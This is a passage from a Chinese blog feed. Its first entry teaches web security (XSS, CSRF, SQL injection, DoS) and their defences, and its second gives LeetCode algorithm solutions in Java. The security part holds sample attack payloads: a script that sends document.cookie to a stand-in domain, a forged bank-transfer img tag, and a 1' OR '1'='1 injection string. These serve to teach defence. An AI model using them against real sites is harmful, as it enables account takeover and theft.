class="hljs-string">&quot;//domain.com/?c=&quot;</span> + <span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p><h2 id="1-3-危害"><a href="#1-3-危害" class="headerlink" title="1.3 危害"></a>1.3 危害</h2><ul><li>窃取用户的 Cookie</li><li>伪造虚假的输入表单骗取个人信息</li><li>显示伪造的文章或者图片</li></ul><h2 id="1-4-防范手段"><a href="#1-4-防范手段" class="headerlink" title="1.4 防范手段"></a>1.4 防范手段</h2><p><strong>设置 Cookie 为 HttpOnly</strong></p><p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。</p><p><strong>过滤特殊字符</strong></p><p>例如将 <code>&lt;</code> 转义为 &amp;lt，将 <code>&gt;</code> 转义为 &amp;gt，从而避免 HTML 和 Jascript 代码的运行。</p><p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p><p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p><p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span>XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;q&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="javascript">alert(<span class="hljs-regexp">/xss/</span>);</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>XSS Demo<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-symbol">&amp;lt;</span>form<span class="hljs-symbol">&amp;gt;</span><br>  <span class="hljs-symbol">&amp;lt;</span>input type=&quot;text&quot; name=&quot;q&quot; value=&quot;test&quot;<span class="hljs-symbol">&amp;gt;</span><br><span class="hljs-symbol">&amp;lt;</span>/form<span class="hljs-symbol">&amp;gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br><br><span class="hljs-symbol">&amp;lt;</span>script type=&quot;text/javascript&quot;<span class="hljs-symbol">&amp;gt;</span><br>alert(/xss/);<br><span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span><br></code></pre></td></tr></table></figure><blockquote><p><a href="http://jsxss.com/zh/try.html">XSS 过滤在线测试(opens new window)</a></p></blockquote><h1 id="2-跨站请求伪造"><a href="#2-跨站请求伪造" class="headerlink" title="2. 跨站请求伪造"></a>2. 跨站请求伪造</h1><h2 id="2-1-概念"><a href="#2-1-概念" class="headerlink" title="2.1 概念"></a>2.1 概念</h2><p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p><p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p><h2 id="2-2-攻击原理"><a href="#2-2-攻击原理" class="headerlink" title="2.2 攻击原理"></a>2.2 攻击原理</h2><p>假如一家银行用以执行转账操作的 URL 地址如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。<br></code></pre></td></tr></table></figure><p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。<br></code></pre></td></tr></table></figure><p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。</p><p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p><p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p><h2 id="2-3-防范手段"><a href="#2-3-防范手段" class="headerlink" title="2.3 防范手段"></a>2.3 防范手段</h2><p><strong>检查 Referer 首部字段</strong></p><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。</p><p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p><p><strong>添加校验 Token</strong></p><p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p><p><strong>输入验证码</strong></p><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p><h1 id="3-SQL-注入攻击"><a href="#3-SQL-注入攻击" class="headerlink" title="3. SQL 注入攻击"></a>3. SQL 注入攻击</h1><h2 id="3-1-概念"><a href="#3-1-概念" class="headerlink" title="3.1 概念"></a>3.1 概念</h2><p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p><h2 id="3-2-攻击原理"><a href="#3-2-攻击原理" class="headerlink" title="3.2 攻击原理"></a>3.2 攻击原理</h2><p>例如一个网站登录验证的 SQL 查询代码为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">strSQL <span class="hljs-operator">=</span> &quot;SELECT * FROM users WHERE (name = &#x27;&quot; <span class="hljs-operator">+</span> userName <span class="hljs-operator">+</span> &quot;&#x27;) and (pw = &#x27;&quot;<span class="hljs-operator">+</span> passWord <span class="hljs-operator">+</span>&quot;&#x27;);&quot;<br></code></pre></td></tr></table></figure><p>如果填入以下内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">userName <span class="hljs-operator">=</span> &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;;<br>passWord <span class="hljs-operator">=</span> &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;;<br></code></pre></td></tr></table></figure><p>那么 SQL 查询字符串为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">strSQL <span class="hljs-operator">=</span> &quot;SELECT * FROM users WHERE (name = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;) and (pw = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;);&quot;<br></code></pre></td></tr></table></figure><p>此时无需验证通过就能执行以下查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">strSQL <span class="hljs-operator">=</span> &quot;SELECT * FROM users;&quot;<br></code></pre></td></tr></table></figure><h2 id="3-3-防范手段"><a href="#3-3-防范手段" class="headerlink" title="3.3 防范手段"></a>3.3 防范手段</h2><p><strong>使用参数化查询</strong></p><p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">PreparedStatement stmt = connection.prepareStatement(<span class="hljs-string">&quot;SELECT * FROM users WHERE userid=? AND password=?&quot;</span>);<br>stmt.setString(<span class="hljs-number">1</span>, userid);<br>stmt.setString(<span class="hljs-number">2</span>, password);<br>ResultSet rs = stmt.executeQuery();<br></code></pre></td></tr></table></figure><p>PreparedStatement可以防止SQL注入的重要原因是预编译和占位符的使用：</p><p>原始代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">select * from student where id = <span class="hljs-number">123</span>;<br></code></pre></td></tr></table></figure><p>SQL注入代码：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id = <span class="hljs-number">123</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br></code></pre></td></tr></table></figure><p>此时数据库认为id = 123和‘1’ = ‘1’成立一个即可，如果使用预编译：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id = (<span class="hljs-number">123</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span>);<br></code></pre></td></tr></table></figure><p>传入的参数被作为整体代入占位符。</p><p><strong>单引号转换</strong></p><p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p><h1 id="4-拒绝服务攻击"><a href="#4-拒绝服务攻击" class="headerlink" title="4. 拒绝服务攻击"></a>4. 拒绝服务攻击</h1><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p><p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p>]]></content>
    
    
    <summary type="html">系统设计的安全性，列举常见的网络攻击方式和防范方法</summary>
    
    
    
    <category term="系统设计" scheme="http://example.com/categories/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="安全" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8/"/>
    
    <category term="系统设计" scheme="http://example.com/tags/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>TOP100</title>
    <link href="http://example.com/2021/03/13/TOP100/"/>
    <id>http://example.com/2021/03/13/TOP100/</id>
    <published>2021-03-13T10:32:02.000Z</published>
    <updated>2021-04-11T10:27:08.747Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-数组"><a href="#1-数组" class="headerlink" title="1. 数组"></a>1. 数组</h1><h2 id="1-1-两数之和"><a href="#1-1-两数之和" class="headerlink" title="1.1 两数之和"></a>1.1 两数之和</h2><p>与剑指offer和为s的两个数字不同的是给定的整型数组不是有序的，这里遍历每个数的同时查找$target-nums[i]$是否存在，使用hashmap存储结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] twoSum(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> target) &#123;<br>    Map&lt;Integer,Integer&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;Integer,Integer&gt;();<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.length; i++)&#123;<br>        <span class="hljs-keyword">if</span>(map.containsKey(target - nums[i]))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;i,map.get(target - nums[i])&#125;;<br>        &#125;<br>        map.put(nums[i],i);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-多数元素"><a href="#1-2-多数元素" class="headerlink" title="1.2 多数元素"></a>1.2 多数元素</h2><p>同剑指offer 数组中出现次数超过一半的数字</p><p>摩尔投票法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">majorityElement</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br><span class="hljs-comment">//x众数,votes票数</span><br>    <span class="hljs-keyword">int</span> x = <span class="hljs-number">0</span>, votes = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> num : nums)&#123;<br>        <span class="hljs-keyword">if</span> (votes == <span class="hljs-number">0</span>)&#123;x = num;&#125;<br>        votes += num == x ? <span class="hljs-number">1</span> : -<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> x;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-3-移动零"><a href="#1-3-移动零" class="headerlink" title="1.3 移动零"></a>1.3 移动零</h2><p>将非0元素填充在首部，剩余元素用0填充</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">moveZeroes</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>,j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>        <span class="hljs-keyword">if</span>(nums[i] != <span class="hljs-number">0</span>)&#123;<br>            nums[j++] = nums[i];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(j &lt; n)&#123;<br>        nums[j++] = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-4-找到所有数组中消失的数字"><a href="#1-4-找到所有数组中消失的数字" class="headerlink" title="1.4 找到所有数组中消失的数字"></a>1.4 找到所有数组中消失的数字</h2><p>我们可以用一个哈希表记录数组 $\textit{nums}$ 中的数字，由于数字范围均在$ [1,n]$ 中，记录数字后我们再利用哈希表检查 $[1,n] $中的每一个数是否出现，从而找到缺失的数字。</p><p>由于数字范围均在 $[1,n]$ 中，我们也可以用一个长度为 n 的数组来代替哈希表。这一做法的空间复杂度是 O(n) 的。我们的目标是优化空间复杂度到 O(1)。</p><p>注意到 $\textit{nums} $的长度恰好也为 n，能否让 $\textit{nums}$ 充当哈希表呢？</p><p>由于 $\textit{nums}$ 的数字范围均在$ [1,n]$ 中，我们可以利用这一范围之外的数字，来表达「是否存在」的含义。</p><p>具体来说，遍历 $\textit{nums}$，每遇到一个数 x，就让 $\textit{nums}[x-1]$ 增加 n。由于 $\textit{nums}$ 中所有数均在 $[1,n]$ 中，增加以后，这些数必然大于 n。最后我们遍历 $\textit{nums}$，若 $\textit{nums}[i]$ 未大于 n，就说明没有遇到过数 i+1。这样我们就找到了缺失的数字。</p><p>注意，当我们遍历到某个位置时，其中的数可能已经被增加过，因此需要对 n取模来还原出它本来的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Integer&gt; <span class="hljs-title">findDisappearedNumbers</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num : nums)&#123;<br>        <span class="hljs-keyword">int</span> x = (num - <span class="hljs-number">1</span>) % n;<br>        nums[x] += n;<br>    &#125;<br>    List&lt;Integer&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;();<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>        <span class="hljs-keyword">if</span>(nums[i] &lt;= n)&#123;<br>            res.add(i + <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-5-盛最多水的容器"><a href="#1-5-盛最多水的容器" class="headerlink" title="1.5 盛最多水的容器"></a>1.5 盛最多水的容器</h2><p>暴力解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxArea</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] height)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>, n = height.length;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n - <span class="hljs-number">1</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++)&#123;<br>            res = Math.max(res,(j - i) * Math.min(height[i],height[j]));<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>双指针</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxArea</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] height)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>,j = height.length - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i &lt; j)&#123;<br>        res = Math.max(res,(j - i) * Math.min(height[i],height[j]));<br>        <span class="hljs-keyword">if</span>(height[i] &lt; height[j])&#123;<br>            i++;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            j--;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>移动数字较小指针的正确性证明：</p><blockquote><p>双指针代表了什么？</p></blockquote><p>双指针代表的是 可以作为容器边界的所有位置的范围。在一开始，双指针指向数组的左右边界，表示 数组中所有的位置都可以作为容器的边界，因为我们还没有进行过任何尝试。在这之后，我们每次将 对应的数字较小的那个指针 往 另一个指针 的方向移动一个位置，就表示我们认为 这个指针不可能再作为容器的边界了。</p><blockquote><p>为什么对应的数字较小的那个指针不可能再作为容器的边界了？</p></blockquote><p>在上面的分析部分，我们对这个问题有了一点初步的想法。这里我们定量地进行证明。</p><p>考虑第一步，假设当前左指针和右指针指向的数分别为 x 和 y，不失一般性，我们假设 $x \leq y$。同时，两个指针之间的距离为 t。那么，它们组成的容器的容量为：</p><script type="math/tex; mode=display">\min(x, y) * t = x * t</script><p>我们可以断定，如果我们保持左指针的位置不变，那么无论右指针在哪里，这个容器的容量都不会超过 $x * t$了。注意这里右指针只能向左移动，因为 我们考虑的是第一步，也就是 指针还指向数组的左右边界的时候。</p><p>我们任意向左移动右指针，指向的数为$ y_1$ ，两个指针之间的距离为 $t_1$ ，那么显然有 $t_1 &lt; t$，并且 $\min(x, y_1) \leq \min(x, y)$ )：</p><ul><li><p>如果 $y_1 \leq y$，那么 $\min(x, y_1) \leq \min(x, y)$；</p></li><li><p>如果 $y_1 &gt; y$ 那么 $\min(x, y_1) = x = \min(x, y)$。</p></li></ul><p>因此有：</p><script type="math/tex; mode=display">\min(x, y_t) * t_1 < \min(x, y) * t</script><p>即无论我们怎么移动右指针，得到的容器的容量都小于移动前容器的容量。也就是说，这个左指针对应的数不会作为容器的边界了，那么我们就可以丢弃这个位置，将左指针向右移动一个位置，此时新的左指针于原先的右指针之间的左右位置，才可能会作为容器的边界。</p><p>这样以来，我们将问题的规模减小了 11，被我们丢弃的那个位置就相当于消失了。此时的左右指针，就指向了一个新的、规模减少了的问题的数组的左右边界，因此，我们可以继续像之前 考虑第一步 那样考虑这个问题：</p><ul><li><p>求出当前双指针对应的容器的容量；</p></li><li><p>对应数字较小的那个指针以后不可能作为容器的边界了，将其丢弃，并移动对应的指针。</p></li></ul><blockquote><p>最后的答案是什么？</p></blockquote><p>答案就是我们每次以双指针为左右边界（也就是「数组」的左右边界）计算出的容量中的最大值。</p><h2 id="1-6-三数之和"><a href="#1-6-三数之和" class="headerlink" title="1.6 三数之和"></a>1.6 三数之和</h2><p>排序+双指针</p><p>暴力解法$O(n^3)$，先排序，固定一个数字，剩下两个数字用剑指offer和为s的两个数字的双指针解法移动，注意排除重复元素并添加优化细节。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;List&lt;Integer&gt;&gt; threeSum(<span class="hljs-keyword">int</span>[] nums) &#123;<br>     Arrays.sort(nums);<br>     <span class="hljs-keyword">int</span> n = nums.length;<br>     List&lt;List&lt;Integer&gt;&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>     <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> m = <span class="hljs-number">0</span>; m &lt; n - <span class="hljs-number">2</span>; m++)&#123;<br>         <span class="hljs-comment">//因为已经排序，最小数字&gt;0则无须继续遍历</span><br>         <span class="hljs-keyword">if</span>(nums[m] &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>         <span class="hljs-comment">//如果当前固定数字和前一个相同，排除重复答案</span><br>         <span class="hljs-keyword">if</span>(m &gt; <span class="hljs-number">0</span> &amp;&amp; nums[m] == nums[m - <span class="hljs-number">1</span>]) <span class="hljs-keyword">continue</span>;<br>         <span class="hljs-keyword">int</span> i = m + <span class="hljs-number">1</span>, j = n - <span class="hljs-number">1</span>;<br>         <span class="hljs-keyword">while</span>(i &lt; j)&#123;<br>             <span class="hljs-keyword">int</span> s = nums[m] + nums[i] + nums[j]; <br>             <span class="hljs-keyword">if</span>(s &gt; <span class="hljs-number">0</span>)&#123;<br>                 <span class="hljs-comment">//j不满足条件，将nums[j]相等元素排除</span><br>                 <span class="hljs-keyword">while</span>(i &lt; j &amp;&amp; nums[j] == nums[--j]);<br>             &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(s &lt; <span class="hljs-number">0</span>)&#123;<br>                 <span class="hljs-comment">//i不满足条件，将nums[i]相等元素排除</span><br>                 <span class="hljs-keyword">while</span>(i &lt; j &amp;&amp; nums[i] == nums[++i]);<br>             &#125;<span class="hljs-keyword">else</span>&#123;<br>                 res.add(<span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;(Arrays.asList(nums[m], nums[i], nums[j])));<br>                 <span class="hljs-comment">//排除重复答案</span><br>                 <span class="hljs-keyword">while</span>(i &lt; j &amp;&amp; nums[i] == nums[++i]);<br>                 <span class="hljs-keyword">while</span>(i &lt; j &amp;&amp; nums[j] == nums[--j]);<br>             &#125;<br>         &#125;<br>     &#125;<br>     <span class="hljs-keyword">return</span> res;<br> &#125;<br></code></pre></td></tr></table></figure><h2 id="1-7-下一个排列"><a href="#1-7-下一个排列" class="headerlink" title="1.7 下一个排列"></a>1.7 下一个排列</h2><ul><li>从后到前找升序对$nums(j - 1),nums(j)$</li><li>将$nums[j - 1]$和后面大于$nums[j - 1]$的最小数交换，并将$nums[j]$后面的数字排序</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">nextPermutation</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-keyword">boolean</span> flag = <span class="hljs-keyword">true</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = n - <span class="hljs-number">1</span>; j &gt; <span class="hljs-number">0</span>; j--)&#123;<br>        <span 